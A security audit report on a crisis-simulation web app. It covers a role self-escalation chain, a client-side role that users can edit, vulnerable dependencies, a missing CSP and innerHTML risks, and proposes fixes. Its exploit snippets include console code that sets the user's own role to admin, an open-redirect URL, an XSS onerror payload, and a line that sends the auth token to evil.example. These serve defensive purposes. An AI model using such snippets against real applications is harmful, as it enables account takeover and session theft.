This review looked at the web application that trainers and participants use to run crisis simulations. The goal was to find weaknesses an attacker could abuse. We found one critical problem that lets any ordinary user secretly promote themselves to the highest level of access ("trainer" or "admin"), plus several other issues ranging from outdated third-party code to missing safety nets.

Finding 1 — Privilege-escalation chain

Any registered user can promote themselves to "trainer" or "admin"

Critical
🟡 In plain English

Think of the app like an office building. A participant is a visitor with a basic guest badge. A trainer/admin is a manager who can unlock every door, change the schedule, and see confidential files.

Right now, the building's badge machine lets visitors print their own manager badge. The security guard at each door (the server) does check the badge — but because the badge says "manager," the guard waves them through. Worse, even after entry, a visitor can walk up to the badge database and rewrite their own badge to "manager" whenever they like.

📍 Where it lives

This is not a single bug — it is a chain of four weaknesses that together form a complete break:

A
The signup form lets the user pick their own role.
frontend/src/pages/SignUp.tsx (lines 66–70, and the role dropdown at 282–298)
const { error } = await signUp(email, password, {
  full_name: fullName,
  role: role,           // <-- chosen by the user, defaults to "trainer"
  agency_name: agencyName,
});
B
The database trigger copies that user-chosen role into the trusted profile table.
migrations/047_fix_handle_new_user_for_anonymous.sql (lines 27–51)
v_invitation_role := COALESCE(NEW.raw_user_meta_data->>'role', 'trainer');
-- ...
  WHEN 'legal_oversight' THEN v_role := 'admin';   -- becomes ADMIN
  ELSE v_role := v_invitation_role;                -- "trainer" passes straight through
-- ...
INSERT INTO public.user_profiles (id, username, full_name, role, agency_name)
VALUES (NEW.id, ..., v_role, ...);   -- the trusted role column is set from user input

And the server reads that exact column to decide what you are allowed to do:

server/middleware/auth.ts (lines 44–56)
if (!userRole) {
  const { data: profile } = await supabaseAdmin
    .from('user_profiles')
    .select('role, agency_name')
    .eq('id', data.user.id)
    .single();
  if (profile) { userRole = profile.role || undefined; }  // trusts the column
}
C
The database lets a user rewrite their own role at any time (the worst part). The security rule controls which row you can edit, but not which columns, and it has no WITH CHECK guard.
migrations/002_rls_policies.sql (lines 29–31)
CREATE POLICY "Users can update their own profile"
  ON user_profiles FOR UPDATE
  USING (auth.uid() = id);   // no column limit, no WITH CHECK -> role is editable
D
A "self-service profile" feature lets a user set their own role — with a guard that does nothing. The check below is an empty comment; the code then saves whatever role was sent, using a powerful "master key" account that ignores the database safety rules from step C.
server/routes/profile.ts (lines 52–69)
// "Only allow role updates if user is admin..." -- but the body is EMPTY:
if (role && role !== 'admin' && user.role !== 'admin') {
  // This allows users to set their own role for testing  <-- does nothing
}
const updates = {};
if (role !== undefined) updates.role = role;            // accepts 'admin'
await supabaseAdmin                                      // master key -> bypasses step C's lock
  .from('user_profiles').update(updates).eq('id', user.id);

Because this uses the master-key account, fixing the database rule in step C is not enough on its own — this endpoint has to be fixed too. (The good news: the app's own screens never call it, so fixing it breaks nothing for users.)

Note added after impact analysis: two facts make this worse. (1) The "official" trusted place for a role (app_metadata) is never set anywhere in the system today, so the role effectively always comes from the user-influenced profile row. (2) There is currently no admin tool to grant someone the trainer role — everyone becomes a trainer simply by signing up. These shape the fix order described in the "Will the fixes break anything?" section below.
⚠️ Why it's a problem

The application's entire permission system rests on a single value — the user's role — and that value originates from, and can be rewritten by, the very person it is meant to restrict. "Never trust input from the user" is the first rule of security; here the most powerful decision in the system is based directly on user input.

💥 How it could be exploited

Two ways, both trivial. The first needs nothing but the public signup page:

// Vector A: just choose "TRAINER" in the signup dropdown. Done.

The second can be run from the browser's developer console by any logged-in user, even one created as a lowly participant:

// Vector C: paste into the browser console while logged in
const { data: { user } } = await supabase.auth.getUser();
await supabase
  .from('user_profiles')
  .update({ role: 'admin' })        // rewrite my own role
  .eq('id', user.id);
// Refresh the page -- the server now treats you as an admin.

Or, even more simply, by asking the server's own profile endpoint to do it:

// Vector D: one request to the app's own API
await fetch('/api/profile', {
  method: 'PATCH',
  headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
  body: JSON.stringify({ role: 'admin' }),
});
🔥 Result if exploited
  • Full trainer/admin control: create and publish injects, start/stop demos, manage incidents, reassign teams, view hidden "ground truth" intelligence meant only for facilitators.
  • Access to other organisations' simulations and participant data they should never see.
  • Ability to sabotage live exercises (e.g. injecting fake events) or read confidential scenario material.
  • Because legal_oversight maps to admin, an attacker can reach the very top tier.
🛠️ Proposed fix

Fix C — lock the role column at the database (most important):

new migration, e.g. migrations/188_lock_user_profile_role.sql
- CREATE POLICY "Users can update their own profile"
-   ON user_profiles FOR UPDATE USING (auth.uid() = id);

+ -- Users may edit their own row, but NOT their role/agency unless they are already admin.
+ CREATE OR REPLACE FUNCTION public.prevent_role_self_escalation()
+ RETURNS TRIGGER AS $$
+ BEGIN
+   IF (NEW.role IS DISTINCT FROM OLD.role OR NEW.agency_name IS DISTINCT FROM OLD.agency_name)
+      AND NOT EXISTS (SELECT 1 FROM user_profiles
+                      WHERE id = auth.uid() AND role = 'admin') THEN
+     RAISE EXCEPTION 'Not allowed to change role/agency';
+   END IF;
+   RETURN NEW;
+ END; $$ LANGUAGE plpgsql SECURITY DEFINER;
+ CREATE TRIGGER trg_prevent_role_self_escalation
+   BEFORE UPDATE ON user_profiles
+   FOR EACH ROW EXECUTE FUNCTION public.prevent_role_self_escalation();

Fix B — stop the signup trigger from trusting user input:

- v_invitation_role := COALESCE(NEW.raw_user_meta_data->>'role', 'trainer');
+ -- New self-service accounts are always 'participant'.
+ -- Elevated roles are granted only by a validated invitation or an admin.
+ v_role := 'participant';

Fix A — remove the role picker from public signup:

frontend/src/pages/SignUp.tsx
// Delete the [CLEARANCE_LEVEL] <select> (lines ~275-299).
// Trainer/admin roles are assigned later by an admin via the server
// using supabaseAdmin.auth.admin.updateUserById(id, {
//   app_metadata: { role } })  -- a store the user cannot edit.

Fix D — make the profile endpoint refuse self-service role changes:

server/routes/profile.ts
- if (role !== undefined) updates.role = role;        // anyone could set any role
+ // Role/agency are NOT self-service. Only an admin may change a role,
+ // and only through the dedicated admin provisioning endpoint.
+ if (role !== undefined && req.user.role !== 'admin') {
+   return res.status(403).json({ error: 'Not allowed to change role' });
+ }
✅ End result after fix
New accounts are always ordinary participants. The role lives in a place users cannot write to (server-set app_metadata / a locked column). All four exploits above now fail: the dropdown is gone, the direct database edit is rejected with "Not allowed to change role," and the profile API returns "403 Forbidden." Privileged access can only be granted deliberately by an existing admin.

Finding 2 — The frontend trusts the user-supplied role

The browser decides what role you are from editable data

High
🟡 In plain English

Even setting aside Finding 1, the app's screens decide what to show you based on a label that the user's own browser carries around — a label the user can rewrite. It is like a cinema that decides whether to show you the "staff only" room based on a sticker you wrote on your own shirt.

📍 Where it lives
frontend/src/contexts/AuthContext.tsx (lines 104–110)
role: (appMetadata.role || metadata.role || defaultRole) as SessionUser['role'],
// metadata.role = user_metadata = freely editable by the user
frontend/src/hooks/useRoleVisibility.ts (line 33)
isTrainer: role === 'trainer' || role === 'admin',  // gates the UI
⚠️ Why it's a problem

user_metadata can be changed at any time by the user with supabase.auth.updateUser({ data: { role: 'admin' } }). Using it to choose what the interface reveals means trainer-only panels, hints, and "ground truth" can be unlocked purely on the client side, regardless of the server.

💥 How it could be exploited
// In the browser console:
await supabase.auth.updateUser({ data: { role: 'admin' } });
// Reload -- the UI now renders every trainer/admin-only component.
🔥 Result if exploited

Trainer-only screens render for a participant. On their own, well-protected server endpoints would still reject the data requests — but any information already embedded in those screens, or any endpoint that is not strictly checked, is exposed. Combined with Finding 1 it is a complete takeover.

🛠️ Proposed fix
frontend/src/contexts/AuthContext.tsx
- role: (appMetadata.role || metadata.role || defaultRole),
+ // Only trust the server-controlled app_metadata, never user_metadata.
+ // Better still, fetch the resolved role from a backend /api/auth/me endpoint.
+ role: (appMetadata.role || defaultRole),

And always treat the frontend role as a display hint only — the server remains the single source of truth for every action.

✅ End result after fix
The interface reflects the role the server assigned, which the user cannot rewrite. Editing user_metadata in the console no longer changes what the app displays.

Finding 3 — Outdated, vulnerable libraries

Third-party packages have publicly known exploits

High
🟡 In plain English

Modern apps are built on top of free, shared building blocks ("libraries"). Some of the blocks this app uses have known defects that have since been fixed by their authors — but the app is still using the old, broken versions. It is like knowing your front door's lock model was recalled for a flaw, yet leaving it installed.

📍 Where it lives

An automated scan (npm audit) of frontend/ reported 10 vulnerabilities (7 high):

PackageIssueSeverity
react-router-dom 7.9.5Remote code execution via bundled turbo-stream; open redirect; XSS; CSRF; denial-of-serviceHigh
wsMemory disclosure & denial-of-serviceHigh
socket.io-parserUnbounded binary attachmentsHigh
@babel/core (build only)Arbitrary file readHigh
postcss (build only)XSS via stringifyModerate
⚠️ Why it's a problem

These flaws are documented publicly with example exploit code. The react-router-dom advisory is especially serious because it includes a remote-code-execution path and an open-redirect issue (an attacker crafting a link that looks like it goes to your site but bounces the victim to a malicious one).

💥 How it could be exploited
// Open-redirect example using the protocol-relative URL flaw:
https://your-app.example/login?redirect=//evil.example/phish
// The victim trusts the first domain, but lands on the attacker's site.
🔥 Result if exploited

Depending on the flaw: phishing via trusted-looking links, denial-of-service, leaking server memory, or in the worst case running attacker code on the server.

🛠️ Proposed fix

Patch within the current major versions, then smoke-test routing and realtime features:

# in frontend/
npm audit fix
npm install react-router-dom@^7.15   # patched line
npm install socket.io-client@latest  # pulls fixed ws / socket.io-parser
npm audit                            # confirm 0 high/critical
✅ End result after fix
The scan reports zero high/critical issues, and the known public exploits no longer apply. A recurring npm audit step should be added so this does not silently drift again.

Finding 4 — No role-based page locks

Debug and trainer pages open to any logged-in user

Medium
🟡 In plain English

The app checks "are you logged in?" before showing a page, but not "are you allowed on this page?" So internal engineering/debug screens and the trainer dashboard open for anyone with any account — like a building that checks you have a badge at the front door but leaves every internal room unlocked.

📍 Where it lives
frontend/src/main.tsx (lines 50–54; routes 131–188)
if (!user) {
  return <Navigate to="/login" replace />;
}
return <>{children}</>;   // any logged-in user passes -- no role check
// affected: /debug/building-studs, /debug/evacuation-sim,
//           /debug/rts-sim, /sim/:sessionId/trainer
⚠️ Why it's a problem

Debug pages expose internal simulation state and tooling; the trainer dashboard is meant only for facilitators. This is defense-in-depth that complements (does not replace) server checks.

💥 How it could be exploited
// A participant simply types the URL:
https://your-app.example/debug/rts-sim
🔥 Result if exploited

Participants see internal/diagnostic tooling and facilitator views, aiding reconnaissance and potentially revealing scenario internals.

🛠️ Proposed fix
frontend/src/main.tsx
+ const RequireRole = ({ roles, children }) => {
+   const { user, loading } = useAuth();
+   if (loading) return <Loading />;
+   if (!user) return <Navigate to="/login" replace />;
+   if (!roles.includes(user.role)) return <Navigate to="/dashboard" replace />;
+   return <>{children}</>;
+ };
// Wrap debug routes in <RequireRole roles={['trainer','admin']}>
// (or render them only when import.meta.env.DEV).
✅ End result after fix
A participant who types a trainer/debug URL is redirected back to their dashboard. Only trainers/admins reach those pages.

Finding 5 — No Content-Security-Policy

No browser-level safety net, and the login token sits in local storage

Medium
🟡 In plain English

A Content-Security-Policy (CSP) is a rulebook the browser enforces that says "only run code from these trusted places." Without it, if malicious code ever sneaks onto a page, the browser will happily run it and let it phone home. Separately, the user's login token is stored where page scripts can read it, so any injected script could steal the active session.

📍 Where it lives
frontend/index.html (no CSP present)
frontend/src/lib/supabase.ts (lines 52–57)
auth: {
  autoRefreshToken: true,
  persistSession: true,      // token kept in localStorage, readable by scripts
  detectSessionInUrl: true,
}
⚠️ Why it's a problem

These two together remove the last line of defense: if any cross-site-scripting (XSS) flaw is ever introduced, there is no CSP to block it and the session token is easy to exfiltrate.

💥 How it could be exploited
// If any XSS foothold exists, an injected script can do:
fetch('https://evil.example/steal?t=' + localStorage.getItem('sb-...-auth-token'));
🔥 Result if exploited

Account/session hijacking and silent data theft, with no browser enforcement to stop it.

🛠️ Proposed fix
frontend/index.html (or a server response header)
+ <meta http-equiv="Content-Security-Policy"
+   content="default-src 'self';
+            connect-src 'self' https://*.supabase.co https://your-api.example;
+            img-src 'self' data: https:;
+            script-src 'self';
+            object-src 'none'; base-uri 'self';">

Keep treating all raw-HTML rendering as static (see Finding 6) so the CSP never has to "save" you.

✅ End result after fix
Even if malicious code reaches a page, the browser refuses to run it or send data to untrusted domains, dramatically shrinking the blast radius of any future XSS.

Finding 6 — Raw HTML built from text

A few places assemble HTML by gluing strings together

Medium
🟡 In plain English

Normally this app displays text safely — if someone types <script>, it shows up as harmless letters. But a couple of spots build raw HTML by pasting values into a template. Today those values come from trusted scenario data, so it is safe. The concern is the pattern: if any of those values ever becomes attacker-influenced, it turns into an injection hole.

📍 Where it lives
frontend/src/components/COP/WindIndicator.tsx (lines 35–40)
container.innerHTML = `
  <div ...>${dirLabel}</div>
  ${speedText ? `<div ...>${speedText}</div>` : ''}
`;   // values are interpolated straight into HTML

Also frontend/src/components/SceneEditor/buildingAutoTrace.ts (line 573, a map popup).

⚠️ Why it's a problem

innerHTML interprets its input as live HTML. If dirLabel ever contained <img src=x onerror=...>, the browser would execute it. It is a latent stored-XSS path.

💥 How it could be exploited
// IF a wind "label" could be set to attacker text:
dirLabel = '<img src=x onerror="alert(document.cookie)">';
// innerHTML would run the onerror handler.
🔥 Result if exploited

Script execution in another user's browser (combined with Finding 5, that means session theft).

🛠️ Proposed fix
- container.innerHTML = `<div>${dirLabel}</div>`;
+ const el = document.createElement('div');
+ el.textContent = dirLabel;   // textContent never interprets HTML
+ container.appendChild(el);
✅ End result after fix
Dynamic values are displayed as plain text and can never become executable code, removing the latent injection path entirely.

Finding 7 — Logging, links & API-key hygiene

Minor information-leakage and hardening gaps

Low
🟡 In plain English

Small housekeeping items: the app prints internal data to the browser console, opens external links in a slightly unsafe way, and ships some API keys that need extra restrictions on the provider's side.

📍 Where it lives & fixes
ItemWhereFix
Always-on console logging of session/team data SessionView.tsx, Sessions.tsx, ChatInterface.tsx Wrap in if (import.meta.env.DEV) or remove.
External link opened without noopener (reverse-tabnabbing) AAR/AARDashboard.tsx line 723 window.open(url, '_blank', 'noopener,noreferrer')

✅ End result after fix

Will the fixes break anything?

Before any code is changed, we checked how each fix ripples through the rest of the app. The encouraging news: most fixes are isolated and safe. But the role fixes and the browser-rulebook (CSP) fix have dependencies — do them in the wrong order and you can lock everyone out or break the maps. This section explains, in plain terms, what to watch for.

🟡 In plain English

Today, the only way anyone becomes a "trainer" is by ticking the box at signup — the very thing we want to remove. And the app has no admin tool to promote someone properly. So if we simply remove the box first, nobody new could ever become a trainer. The fix order matters: we must build the proper "admin promotes a user" door before we brick up the old one.

Similarly, the screens decide what to show based on your role. If we change where that role comes from without first filling in the new source, the app could accidentally treat everyone as a trainer. These are not reasons to avoid the fixes — just reasons to sequence them carefully.

📍 Risk by fix
FixBreakage riskWhat to watch for
Default new users to "participant" (Vector B) High Breaks new-trainer onboarding unless an admin promotion tool ships first. Existing trainers are unaffected.
Remove signup role picker (Vector A) Medium Invitation sign-ups must get their role validated by the server instead of the form.
Lock the role column in the database (Vector C) Low Safe — the app only ever reads profiles from the browser; legitimate writes use the admin account, which is unaffected.
Fix the profile API (Vector D) Low The app's screens never call it, so nothing user-facing breaks.
Stop the browser trusting its own role label (Finding 2) High Must be paired with reading the role from the server first, or every participant would be shown the trainer view.
Update outdated libraries (Finding 3) Low Independent. Only stable features are used; quick test of navigation + live updates after upgrading.
Lock trainer/debug pages (Finding 4) Low The trainer button is already hidden from participants, so this is consistent. Do not lock the underlying map data service that the War Room legitimately uses.
Add the browser rulebook / CSP (Finding 5) Medium Highest-friction. If the allow-list misses a service (maps, fonts, geocoding), those silently break. Roll it out in "report-only" mode first, watch for complaints, then enforce.
Safer HTML building (Finding 6) & hygiene (Finding 7) Low Independent and self-contained.
🛠️ The safe order to apply them
  1. Build the admin "promote a user" tool and copy existing roles into the trusted, locked location.
  2. Make the screens read the role from the server.
  3. Then remove the signup picker, default new users to participant, fix the profile API, and lock the database column.
  4. Add the page locks.
  5. Roll out the browser rulebook (CSP) in report-only mode, then enforce.
  6. Ship the independent items (library updates, safer HTML, hygiene) anytime — they don't depend on the above.
✅ Two rules that prevent self-inflicted outages
  • Don't remove the old door before building the new one: the admin promotion path and server-provided role must exist before the signup/role changes land.
  • The database lock alone isn't enough: the profile API uses a master-key account that ignores that lock, so it must be fixed in the same batch.

What was checked and found safe

For balance, several common weak spots were examined and are currently not vulnerable:

  • User-generated content (chat, social posts, emails, insider answers) is rendered as escaped text by React, so typed-in <script> is shown harmlessly, not executed.
  • All dangerouslySetInnerHTML usages (icons in MapElementResponsePanel, AssetPalette, EvacuationZone, ScenarioDetailView) resolve through fixed, built-in icon tables (mapIcons.svg()), never from user text.
  • No use of dangerous evaluators like eval() or new Function().
  • No hardcoded passwords, secret keys, or committed .env files were found in frontend/src.
  • The server does enforce role checks on sensitive endpoints (e.g. only trainers can create/publish injects) — which is why fixing the role chain in Finding 1 closes the loop properly.

Plain-English glossary

Role / privilegeThe level of access an account has (participant = basic, trainer/admin = powerful).
Privilege escalationA user gaining more access than they should — e.g. a participant becoming an admin.
Frontend / backendFrontend = what runs in your browser (can be tampered with). Backend = the server you can't directly touch (the real authority).
RLS (Row-Level Security)Database rules that decide which rows/columns each user can read or change.
XSS (Cross-Site Scripting)Tricking a page into running attacker-supplied code in a victim's browser.
CSP (Content-Security-Policy)A browser rulebook limiting where code and data are allowed to come from.
Token / sessionA digital "wristband" proving you're logged in; stealing it impersonates you.
Open redirectA link that looks like it goes to a trusted site but forwards the victim to a malicious one.
Dependency / libraryReusable code written by others that the app is built on; can carry its own flaws.
